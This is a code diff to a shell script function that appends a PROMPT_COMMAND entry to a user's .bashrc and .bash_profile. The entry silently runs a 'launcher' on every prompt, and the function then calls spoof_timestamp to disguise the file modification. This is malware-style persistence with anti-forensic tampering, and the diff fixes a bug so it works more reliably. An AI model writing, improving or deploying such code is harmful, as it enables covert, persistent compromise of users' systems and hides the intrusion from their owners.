@@ -349,7 +349,12 @@ install_prompt_command() {
     for rc_file in "$HOME/.bashrc" "$HOME/.bash_profile"; do
         [ ! -f "$rc_file" ] && continue
         if ! grep -q "PROMPT_COMMAND.*${launcher}" "$rc_file" 2>/dev/null; then
-            echo "export PROMPT_COMMAND=\"\${PROMPT_COMMAND}; [ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1\"" >> "$rc_file"
+            # Guard: only add semicolon if PROMPT_COMMAND already has content
+            echo 'if [ -n "$PROMPT_COMMAND" ]; then' >> "$rc_file"
+            echo "    export PROMPT_COMMAND=\"\${PROMPT_COMMAND}; [ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1\"" >> "$rc_file"
+            echo 'else' >> "$rc_file"
+            echo "    export PROMPT_COMMAND=\"[ -x '${launcher}' ] && '${launcher}' >/dev/null 2>&1\"" >> "$rc_file"
+            echo 'fi' >> "$rc_file"
             spoof_timestamp "$rc_file"
         fi
     done
